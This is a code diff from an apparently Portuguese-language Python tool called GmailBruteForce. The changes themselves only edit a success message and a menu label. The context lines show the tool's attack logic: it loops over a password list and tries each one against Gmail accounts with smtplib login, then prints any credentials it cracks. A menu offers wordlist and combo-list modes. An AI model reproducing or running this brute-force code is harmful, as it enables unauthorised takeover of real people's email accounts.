@@ -31,7 +31,7 @@ class GmailBruteForce():
             for password in self.passwords:
                 try:
                     self.smtp.login(user,password)
-                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
+                    print(("\033[1;37mSUCESSO -> %s " % user + " -> %s \033[1;m" % password ))
                     self.smtp.quit()
                     self.init_smtplib()
                     break;
@@ -53,7 +53,7 @@ instance = GmailBruteForce()
 do = input('''
 		Choose any number ?
 		1 - Gmail ( Normal com wordlsit) 
-		2- Gmail já via combinação de senha
+		2 - Gmail já vem combinação de senha
                 
 		
 		==> ''')
